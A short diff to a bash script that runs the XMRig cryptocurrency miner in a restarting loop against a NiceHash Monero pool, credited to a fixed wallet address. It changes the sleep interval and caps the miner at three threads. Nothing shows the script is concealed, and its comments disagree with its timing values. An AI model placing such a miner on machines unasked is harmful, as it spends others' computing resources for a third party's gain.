@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Define the wait time of 10 minutes (600 seconds)
-SLEEP_DURATION=60
+SLEEP_DURATION=690
 
 # Download and extract XMRig
 if [ ! -f xmrigDaemon ]; then
@@ -14,7 +14,7 @@ fi
 while true; do
    # Start the miner
    echo "Starting xmrigDaemon..."
-   ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.newguy -p x -a rx/0 -k &
+   ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.newguy -p x -a rx/0 -k -t 3 &
    DAEMON_PID=$!
 
    # Sleep for 15 minutes
